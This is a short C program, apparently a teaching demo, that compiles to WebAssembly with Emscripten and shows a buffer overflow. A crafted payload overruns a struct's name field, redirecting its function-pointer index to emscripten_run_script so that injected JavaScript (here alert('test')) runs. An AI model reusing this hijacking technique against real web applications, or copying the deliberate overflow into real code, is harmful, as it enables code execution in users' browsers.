#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "emscripten.h"


// emcc control.c -g -o control.js -sEXPORTED_FUNCTIONS=_main -sEXPORTED_RUNTIME_METHODS=ccall,cwrap

// This program demonstrates how function pointers are turned into integer indexes into a function table
// int add(int x) {
//     return x+1;
// }
// int main(){
//     printf("add                  : %p\n", &add);
//     printf("emscripten_run_script: %p\n", &emscripten_run_script);
//     return 0;
// }


// TODO: make better user interface. Have a "input name" function that allows a user to create
// a username. The function will just strcpy the string they provide into the name field
// and call the greeting function with their name.

// A struct with a function pointer member
typedef struct {
    char name[32];
    void (*greeting) (char*);
} Greeting;


void basic_greeting(char* name) {
    printf("Hello %s!\n", name);
}

void premium_greeting(char* name) {
    printf("~~~~ My deepest gratitude, %s ~~~~\n", name);
}



int main(){

    // Get function indices
    printf("Index of basic_greeting       : %p\n", &basic_greeting);
    printf("Index of emscripten_run_script: %p\n", &emscripten_run_script);

    // Allocate structure on stack (or heap, works either way)
    Greeting basic = {"Mr. Basic", &basic_greeting};

    // Buffer overflow
    char* payload = "alert('test');\\\\" // Code to inject
                    "aaaaaaaaaaaaaaaa"   // Padding
                    "\x02";              // Overwrite table index with index of emscripten_run_script
    memcpy(basic.name, payload, 34);

    //basic.greeting(basic.name);
    printf("%p\n", &basic);
    printf("%p\n", &basic.greeting);

    basic.greeting("alert('test');");

    
    return 0;
}